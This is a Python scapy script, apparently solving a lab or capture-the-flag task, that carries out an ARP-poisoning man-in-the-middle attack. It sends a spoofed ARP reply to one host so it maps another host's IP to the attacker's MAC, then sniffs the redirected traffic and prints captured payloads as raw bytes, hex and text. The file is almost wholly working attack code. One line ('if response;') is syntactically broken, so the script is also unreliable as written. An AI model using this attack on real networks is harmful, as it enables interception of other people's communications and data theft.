"""
Intercept traffic from a remote host. You are at 10.0.0.1 (Host A). The remote host at 10.0.0.2 (Host B) is communicating with the remote host at 10.0.0.3 (Host C) on port 31337.
"""

from scapy.all import *
import time


def verify_arp_poisoning(b_ip, c_ip, iface="eth0"):
    a_mac = get_if_hwaddr(iface)

    print(f"=== ARP Poisoning Verification ===")
    print(f"Machine A (interceptor) MAC: {a_mac}")
    print(f"Machine B (victim) IP: {b_ip}")
    print(f"Machine C (target) IP: {c_ip}")
    print()

    # Spoofing B arp table with A'c mac address -> C's IP address
    print("[1] Sending gratuitous ARP to B...")
    send(
        ARP(op=2, pdst=b_ip, psrc=c_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=a_mac),
        iface=iface,
        verbose=False,
    )
    time.sleep(1)

    # Test 2: C IP is mapped to A hw address. Checking if it works and replies to A. op = 1, who has B? broadcast request.
    print("[2] Sending ARP request from C to B, checking if B replies.")
    response = sr1(
        ARP(pdst=b_ip, psrc=c_ip, op=1), timeout=2, iface=iface, verbose=False
    )

    if response;
        print(f"B's MAC: {response.hwsrc}")

    # Test 3: Sniff for actual traffic WITH DATA
    print("[3] Sniffing for 10 seconds to see if B's traffic comes to A...")
    print()

    intercepted = [False]
    packet_count = [0]

    def check_traffic(pkt):
        if IP in pkt and pkt[IP].src == b_ip and pkt[IP].dst == c_ip:
            intercepted[0] = True
            packet_count[0] += 1

            print(f"{'='*70}")
            print(f"[✓] Intercepted packet #{packet_count[0]} from B to C!")
            print(f"Time: {time.strftime('%H:%M:%S')}")
            print(f"Source: {pkt[IP].src}", end="")

            if TCP in pkt:
                print(f":{pkt[TCP].sport}")
                print(f"Dest: {pkt[IP].dst}:{pkt[TCP].dport}")
                print(f"TCP Flags: {pkt[TCP].flags}")
                print(f"Seq: {pkt[TCP].seq}, Ack: {pkt[TCP].ack}")
            elif UDP in pkt:
                print(f":{pkt[UDP].sport}")
                print(f"Dest: {pkt[IP].dst}:{pkt[UDP].dport}")
            else:
                print()
                print(f"Dest: {pkt[IP].dst}")

            # Check for payload data
            if Raw in pkt:
                data = pkt[Raw].load
                print(f"\n[PAYLOAD CAPTURED - {len(data)} bytes]")
                print(f"Raw bytes: {data}")
                print(f"Hex: {data.hex()}")

                # Try to decode as text
                try:
                    text = data.decode("utf-8")
                    print(f"Text: '{text}'")
                except UnicodeDecodeError:
                    print(f"Text: [Binary data, not UTF-8]")

                # Show hex dump for better visualization
                print(f"\n[Hex Dump]")
                hexdump(data)
            else:
                print(f"\n[No payload - likely TCP handshake/control packet]")

            print(f"{'='*70}\n")
            return True

    sniff(
        iface=iface,
        prn=check_traffic,
        filter=f"host {b_ip} and host {c_ip}",
        timeout=10,
        store=0,
    )

    print(f"\n{'='*70}")
    if intercepted[0]:
        print(f"[SUCCESS] ARP poisoning is working!")
        print(f"Total packets intercepted: {packet_count[0]}")
    else:
        print("[FAILED] No traffic intercepted. ARP poisoning may not be working.")
    print(f"{'='*70}")


# Run it
verify_arp_poisoning("10.0.0.2", "10.0.0.3", "eth0")
